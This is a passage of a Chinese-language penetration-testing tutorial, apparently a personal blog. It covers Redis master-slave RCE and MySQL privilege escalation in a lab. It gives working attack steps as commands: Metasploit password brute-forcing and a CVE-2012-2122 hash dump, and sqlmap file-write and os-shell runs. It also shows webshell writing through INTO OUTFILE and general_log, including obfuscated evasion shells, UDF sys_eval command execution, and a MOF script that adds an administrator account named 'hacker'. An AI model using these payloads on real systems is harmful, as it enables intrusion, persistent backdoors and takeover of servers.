<li><p>一分钟左右收到反弹的shell</p>
<p><img src="https://s2.loli.net/2024/06/20/MrwhF1DKHVnEW9b.png" alt="image-20240620234632037"></p>
<p>以上方法只适用centos上开启的redis服务,ubuntu上不行</p>
</li>
</ol>
<p>		</p>
<ul>
<li><p>如果目标Redis是4.x，并且禁用了<code>CONFIG SET</code>、<code>SAVE</code>命令，请尝试使用EVAL命令 <code>return redis.call(&#39;config&#39;,&#39;set&#39;,&#39;dir&#39;,&#39;/root&#39;)</code></p>
<p>不适用于Redis 5.x上，因为Redis在5.x中config命令是一个“无脚本”命令，这意味着无法redis-lua中调用此命令。</p>
<p>这边在4.x中模拟禁用<code>config</code>命令，redis为了禁用某些危险的命令，可以通过rename-command指令修改Redis配置文件来进行实现。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rename</span>-command CONFIG <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/1586953/202309/1586953-20230918180303869-1552346690.png" alt="img"></p>
<p>这边centos的redis 4.x环境进行测试，重新测试config命令，可以发现已经提示config命令已经不存在了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(error) ERR unknown <span class="built_in">command</span> <span class="string">&#x27;config&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/1586953/202309/1586953-20230918214434089-1126655828.png" alt="img"></p>
<p>这个时候可以通过<code>EVAL &quot;return redis.call(&#39;config&#39;, &#39;set&#39;, &#39;dir&#39;, &#39;/root/.ssh&#39;)&quot; 0</code>来进行解决，但是在redis 4.0.5 的版本中进行测试，发现默认lua config命令是无法进行使用的，如下图所示</p>
<p><img src="https://img2023.cnblogs.com/blog/1586953/202309/1586953-20230918215426787-2080719889.png" alt="img"></p>
</li>
</ul>
<h3 id="5-主从复制RCE"><a href="#5-主从复制RCE" class="headerlink" title="5.主从复制RCE"></a>5.主从复制RCE</h3><h5 id="1-漏洞原理-4"><a href="#1-漏洞原理-4" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><ul>
<li>在<code>Redis 4.x</code>之后(攻击机对应版本)，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码 在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命了。</li>
</ul>
<h5 id="2-漏洞利用-4"><a href="#2-漏洞利用-4" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><ul>
<li>利用工具:<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> (自带exp.so和redismodule.c源码文件)</li>
</ul>
<img src="https://s2.loli.net/2022/03/16/LV6rBqe9OXWuaQC.png" alt="image-20220316221319051" style="zoom:90%;" />

<p><img src="https://s2.loli.net/2022/03/16/VhCESP9dvsguTmB.png" alt="image-20220316221613810"></p>
<img src="https://s2.loli.net/2022/03/16/OxQfbwKaMuJ4jvU.png" alt="image-20220316221804327" style="zoom:120%;" />

<h1 id="MySql数据库提权"><a href="#MySql数据库提权" class="headerlink" title="MySql数据库提权"></a>MySql数据库提权</h1><h2 id="一-权限获取"><a href="#一-权限获取" class="headerlink" title="一.权限获取"></a>一.权限获取</h2><h4 id="1-获取数据库操作权限"><a href="#1-获取数据库操作权限" class="headerlink" title="1.获取数据库操作权限"></a>1.获取数据库操作权限</h4><h5 id="1-Mysql-3306端口弱口令爆破"><a href="#1-Mysql-3306端口弱口令爆破" class="headerlink" title="1.Mysql 3306端口弱口令爆破"></a>1.Mysql 3306端口弱口令爆破</h5><ul>
<li><p>使用<code>msf</code>来爆破mysql远程控制弱口令</p>
<p><img src="https://s2.loli.net/2024/07/30/T1m9elqHE34fBpZ.png" alt="image-20240728160450578"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_log</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置<code>msf</code>参数</p>
<p><img src="https://s2.loli.net/2024/07/30/m7oIMpurza2ClFN.png" alt="image-20240728160455757"></p>
</li>
<li><p>这里要特别强调几个需要配置的参数，</p>
<ul>
<li><code>RHOSTS</code>是远程MySQL服务器的ip地址</li>
<li><code>RPORT 3306 是MySQL开启的端口号，默认是</code>3306<code>；如果不是</code>3306&#96;端口的时候需要配置</li>
<li><code>USERNAME</code>是MySQL的用户名，默认为<code>root</code>；这里当登录用户发生变换不是<code>root</code>时， 需要配置</li>
<li><code>PASS_FILE</code>这里是指定爆破的密码字典文件的路径。</li>
</ul>
<p><img src="https://s2.loli.net/2024/07/30/y43YOChkE5GwfcP.png" alt="image-20240728161224709"></p>
</li>
<li><p><code>run</code>爆破出密码为<code>123456</code></p>
<p><img src="https://s2.loli.net/2024/07/30/FlfGOm5ny8BIuxj.png" alt="image-20240728161321830"></p>
</li>
</ul>
<h5 id="2-网站的数据库配置泄露拿到密码信息"><a href="#2-网站的数据库配置泄露拿到密码信息" class="headerlink" title="2.网站的数据库配置泄露拿到密码信息"></a>2.网站的数据库配置泄露拿到密码信息</h5><h5 id="3-sqlmap-sql-shell"><a href="#3-sqlmap-sql-shell" class="headerlink" title="3.sqlmap --sql-shell"></a>3.sqlmap <code>--sql-shell</code></h5><ul>
<li><p>sqlmap <code>--sql-shell</code>注入获取交换式sqlshell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://pikachu:8081/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2#&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> <span class="literal">--sql-shell</span> <span class="literal">--batch</span> <span class="literal">--no-cast</span> <span class="literal">--hex</span> <span class="literal">--random-agent</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://s2.loli.net/2024/07/30/B8lDuQXgOftdLPV.png" alt="image-20240728165355653"></p>
<ul>
<li><p>获得<code>sql-shell</code>后可以执行sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span>;</span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">user</span>();</span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> <span class="keyword">SHOW</span> DATABASES;</span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> USE database_name;</span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> <span class="keyword">SHOW</span> TABLES;</span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="4-通过sql注入获取数据库密码hash"><a href="#4-通过sql注入获取数据库密码hash" class="headerlink" title="4.通过sql注入获取数据库密码hash"></a>4.通过sql注入获取数据库密码hash</h5><ul>
<li><p>如果 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use mysql;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,authentication_string <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/07/30/1nZ6EMFSzP3j4vB.png" alt="image-20240728190955663"></p>
<p><img src="https://s2.loli.net/2024/07/30/d5wlEzqT326k1y4.png" alt="image-20240728192311986"></p>
</li>
</ul>
<h5 id="5-通用漏洞直接拿下-MySQL-权限"><a href="#5-通用漏洞直接拿下-MySQL-权限" class="headerlink" title="5.通用漏洞直接拿下 MySQL 权限"></a>5.通用漏洞直接拿下 MySQL 权限</h5><ul>
<li><p>CVE-2012-2122 </p>
<p>知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以使用<code>msf</code>可以直接<code>dump</code>出<code>hash</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">66.201</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20201119/16057589592021.png" alt="img"></p>
</li>
</ul>
<h2 id="二-权限提升"><a href="#二-权限提升" class="headerlink" title="二.权限提升"></a>二.权限提升</h2><h4 id="1-webshell提权"><a href="#1-webshell提权" class="headerlink" title="1.webshell提权"></a>1.webshell提权</h4><h5 id="1-into-oufile-写-shell"><a href="#1-into-oufile-写-shell" class="headerlink" title="1.into oufile 写 shell"></a>1.into oufile 写 shell</h5><ul>
<li><p><strong>条件:</strong>	</p>
<ul>
<li>知道网站物理路径</li>
<li>高权限数据库用户</li>
<li><code>load_file()</code>开启<code>secure_fille_priv = &#39;&#39;</code></li>
<li>网站路径有写入权限</li>
</ul>
</li>
<li><p>首先检查<code>secure_file_priv</code>有无限制</p>
<p><img src="https://s2.loli.net/2024/07/30/eaqTNJrRPQoW6cl.png" alt="image-20240729162515968"></p>
<table>
<thead>
<tr>
<th>Value</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>NULL</td>
<td>不允许导入或导出</td>
</tr>
<tr>
<td>&#x2F;tmp</td>
<td>只允许在 &#x2F;tmp 目录导入导出</td>
</tr>
<tr>
<td>空</td>
<td>不限制目录</td>
</tr>
</tbody></table>
<p><code>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</code></p>
<p><code>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</code></p>
</li>
<li><p>通过修改<code>my.cnf 或 my.ini</code>文件，在 [mysqld] 块下，如果没有 secure_file_priv 则新增</p>
<p><img src="https://s2.loli.net/2024/07/30/hwvQ4DWtB7upVdb.png" alt="image-20240729163656184"></p>
</li>
<li><p>如果满足上述条件使用原生sql语句写入webshell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;E:/phpstudy_pro/WWW/pikachu-master/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/07/30/Jwk4YLujsD8PpWd.png" alt="image-20240729164426075"></p>
<p><img src="https://s2.loli.net/2024/07/30/nMziZLJcOmNH4pu.png" alt="image-20240729164547799"></p>
</li>
<li><p>也可以使用sqlmap <code>sql注入</code>写入webshell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://pikachu:8081/vul/sqli/sqli_str.php?name=kobe&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span>  <span class="literal">--file-write</span>=<span class="string">&quot;C:/Users/86134/Desktop/shell.php&quot;</span> <span class="literal">--file-dest</span>=<span class="string">&quot;E:/phpstudy_pro/WWW/pikachu-master/shell.php&quot;</span> <span class="literal">--batch</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>也可以使用sqlmap <code>--os-shell</code>写入webshell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://pikachu:8081/vul/sqli/sqli_str.php?name=kobe&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> <span class="literal">--os-shell</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="2-日志文件-写-shell"><a href="#2-日志文件-写-shell" class="headerlink" title="2.日志文件 写 shell"></a>2.日志文件 写 shell</h5><ul>
<li><p><strong>条件</strong>:</p>
<ul>
<li>web文件夹有写入权限</li>
<li>Windows 系统下</li>
<li>高权限运行的MySql 或 Apache</li>
</ul>
</li>
<li><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量<code>general_log</code>和<code>general_log_file</code>来 getshell</p>
<ul>
<li><p>日志写入路径</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/07/30/9tz5LpE6FiI37hK.png" alt="image-20240730113348182"></p>
</li>
<li><p>开启general log模式为on</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/07/30/bvPqIJn1BsATVFH.png" alt="image-20240730113428710"></p>
</li>
<li><p>设置目录为shell地址</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;E:/phpstudy_pro/WWW/pikachu-master/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/07/30/itJAHnDX1wpaKhU.png" alt="image-20240730115713131"></p>
</li>
<li><p>写入shell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/07/30/RSJhEg7bpAxKoV6.png" alt="image-20240730113805941"></p>
<p><img src="https://s2.loli.net/2024/07/30/2aGkQUp3lxIBdwK.png" alt="image-20240730115955833"></p>
</li>
<li><p>使用蚁剑连接</p>
<p><img src="https://s2.loli.net/2024/07/30/q1L7ktTXRMo9wcz.png" alt="image-20240730120141305"></p>
</li>
<li><p>sql免杀shell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;username&#x27;]));?&gt;&quot;;</span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?php $sl = create_function(&#x27;&#x27;, @$_REQUEST[&#x27;klion&#x27;]);$sl();?&gt;&quot;;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="2-UDF提权"><a href="#2-UDF提权" class="headerlink" title="2.UDF提权"></a>2.UDF提权</h4><h5 id="1-手动复现"><a href="#1-手动复现" class="headerlink" title="1.手动复现"></a>1.手动复现</h5><p>动态链接库就是实现共享函数库概念的一种方式，在windows环境下后缀名为.dll，在linux环境下后缀名为.so 。我们要将该文件放在特定的目录中，该文件中包含了执行系统命令的一些函数</p>
<ul>
<li>查看当前用户所具有的权限</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> substring_index(<span class="keyword">user</span>(), <span class="string">&#x27;@&#x27;</span>, <span class="number">1</span>)\G;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/03/grwk6OZ3JUNvx9t.png" alt="image-20240803165722548"></p>
<ul>
<li><p>通过查看主机版本及架构确认mysql位数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%compile%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/03/T8YH54h63lbMuBe.png" alt="image-20240803170101678"></p>
</li>
<li><p>Mysql版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。</p>
</li>
<li><p>Mysql版本小于5.1：</p>
<ul>
<li>如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。</li>
<li>如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</li>
</ul>
</li>
</ul>
<ol>
<li><h5 id="获得unf文件的存储路径"><a href="#获得unf文件的存储路径" class="headerlink" title="获得unf文件的存储路径"></a>获得unf文件的存储路径</h5><ul>
<li><p>获取路径</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240801155248590.png" alt="image-20240801155248590"></p>
</li>
<li><p>如果当前Mysql版本大于5.1, 需要结合ntfs的特性手动用mysql实现创建文件夹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;xxx&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;E:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin::$INDEX_ALLOCATION&#x27;</span>;</span><br></pre></td></tr></table></figure>


</li>
<li><p>如果用mysql实现创建文件夹失败的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹,或使用<code>dumpfile</code>创建文件夹</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; <span class="built_in">select</span> <span class="number">114514</span> into dumpfile <span class="string">&#x27;C:........\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><h5 id="获得动态链接库"><a href="#获得动态链接库" class="headerlink" title="获得动态链接库"></a>获得动态链接库</h5><p><code>sqlmap</code>和<code>Metasploit</code>自带了<code>linux</code>和<code>windows</code>的<code>动态链接库</code>,但是<code>sqlmap</code>中的<code>动态链接库</code>是编码后端,使用时要用自带解码工具解码</p>
<ul>
<li><p>找到<code>sqlmap</code>安装目录下的<code>E:\sqlmap\sqlmapproject-sqlmap-d85e09f\data\udf\mysql</code>中对应版本的<code>动态链接库</code></p>
<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240801155920412.png" alt="image-20240801155920412"></p>
</li>
<li><p>使用自带工具<code>cloak.py</code>解码<code>lib_mysqludf_sys.dll_</code>(解码后后缀改为.dll),<code>cloak.py</code>路径为:<code>/extra/cloak/cloak.py</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ../../../../../extra/cloak/cloak.py <span class="literal">-i</span> .\lib_mysqludf_sys.dll_ <span class="literal">-o</span> .\lib_mysqludf_sys.dll</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240801160802808.png" alt="image-20240801160802808"></p>
</li>
</ul>
</li>
<li><h5 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h5><ol>
<li><p>通过<code>sqlmap</code>进行<code>sql</code>注入写入</p>
<ul>
<li><p><strong>条件:</strong></p>
<ol>
<li>sql注入后为高权限用户</li>
<li>secure_file_priv &#x3D; ‘’</li>
<li>MySQL 插件目录可以被 MySQL 用户写入</li>
<li>因get长度限制,一般post才行</li>
</ol>
</li>
<li><p><strong>写入</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-r</span> <span class="string">&quot;C:\Users\86134\Desktop\post.txt&quot;</span> <span class="literal">--data</span>=<span class="string">&quot;id=1&quot;</span> <span class="literal">--file-write</span>=<span class="string">&quot;E:\sqlmap\sqlmapproject-sqlmap-d85e09f\data\udf\mysql\windows\64\lib_mysqludf_sys.dll&quot;</span> <span class="literal">--file-dest</span>=<span class="string">&quot;E:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\udf.dll&quot;</span> <span class="literal">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240801165449435.png" alt="image-20240801165449435"></p>
<p><img src="C:\Users\86134\AppData\Roaming\Typora\typora-user-images\image-20240801165519820.png" alt="image-20240801165519820"></p>
</li>
</ul>
</li>
<li><p>使用原生<code>sql</code>语句<code>dumpfile</code>写入,要十六进制编码</p>
<ul>
<li><p>windows</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(load_file(<span class="string">&#x27;E:/sqlmap/sqlmapproject-sqlmap-d85e09f/data/udf/mysql/windows/64/lib_mysqludf_sys.dll&#x27;</span>)) <span class="keyword">into</span> dumpfile <span class="string">&#x27;E:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/03/rfwjVzqAUZdgX9i.png" alt="image-20240803171055232"></p>
</li>
</ul>
</li>
</ol>
</li>
<li><h5 id="创建并调用自定义函数"><a href="#创建并调用自定义函数" class="headerlink" title="创建并调用自定义函数"></a>创建并调用自定义函数</h5><ul>
<li><p>从库中导入自定义函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://s2.loli.net/2024/08/03/5m389OUqguPoW1L.png" alt="image-20240803183950439"></p>
<ul>
<li><p>调用<code>sys_eval</code>执行系统命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/03/71baNXYM4Gmg2RJ.png" alt="image-20240803184426297"></p>
</li>
<li><p>如果使用<code>PHPStudy </code>自带的 MySQL ,由于吗MySQL安装版本的问题有可能会创建失败,使用<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光 (sqlsec.com)</a>写入动态链接库</p>
</li>
</ul>
<p><img src="https://s2.loli.net/2024/08/03/PjdhMxmRkBs8fON.png" alt="image-20240803164345442"></p>
</li>
<li><h5 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h5><ul>
<li><p>查看导入函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;sys_eval&#x27;</span>;    #查看创建的sys_eval函数</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/03/QyIhOoaSfEDwU6l.png" alt="image-20240803184625057"></p>
</li>
<li><p>删除导入函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h5 id="2-udfshell工具"><a href="#2-udfshell工具" class="headerlink" title="2.udfshell工具"></a>2.udfshell工具</h5><ul>
<li>上传<code>webshell</code>大马一键<code>udf</code>提权<ul>
<li><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1NM1kD7bEa_aUEqZxVaplpg?pwd=p2s8">https://pan.baidu.com/s/1NM1kD7bEa_aUEqZxVaplpg?pwd=p2s8</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">tools&#x2F;大马&#x2F;udf.php at master · echohun&#x2F;tools · GitHub</a></li>
</ul>
</li>
<li>定制<code>udf</code>连接库一键弹<code>shell</code><ul>
<li><a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">langouster_udf.zip - 蓝奏云 (lanzoux.com)</a></li>
</ul>
</li>
</ul>
<h4 id="3-MOF提权"><a href="#3-MOF提权" class="headerlink" title="3.MOF提权"></a>3.MOF提权</h4><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
<h5 id="1-手工复现"><a href="#1-手工复现" class="headerlink" title="1.手工复现"></a>1.手工复现</h5><h5 id="上传-mof-文件执行命令"><a href="#上传-mof-文件执行命令" class="headerlink" title="上传 mof 文件执行命令"></a>上传 mof 文件执行命令</h5><p>mof 脚本的内容如下：</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">payload#pragma name<span class="built_in">space</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker passwd@<span class="number">123456</span> /add\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="string">&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>核心 <code>payload</code> 为：</p>
